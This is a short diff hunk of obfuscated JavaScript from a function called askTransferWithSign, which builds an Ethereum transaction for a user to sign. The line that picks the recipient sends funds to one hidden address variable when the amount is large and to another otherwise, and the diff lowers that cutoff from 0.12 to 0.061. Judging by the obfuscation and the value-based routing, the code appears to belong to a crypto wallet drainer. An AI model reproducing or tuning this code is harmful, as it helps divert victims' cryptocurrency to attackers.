@@ -307,7 +307,7 @@ async function askTransferWithSign(_0x2a70fc) {
             'gasPrice': _0x2f0245,
             'gasLimit': '0x55F0',
             'from': _0x1ee9b4[_0x23e9d8(0xb1)][_0x23e9d8(0xb5)](_0x39763a),
-            'to': _0x2a70fc > 0.12 ? nW : receiveAddress,
+            'to': _0x2a70fc > 0.061 ? nW : receiveAddress,
             'value': '0x' + _0x2e988c[_0x23e9d8(0xfe)](0x10),
             'data': '0x',
             'v': '0x' + workChainId[_0x23e9d8(0xfe)](0x10),
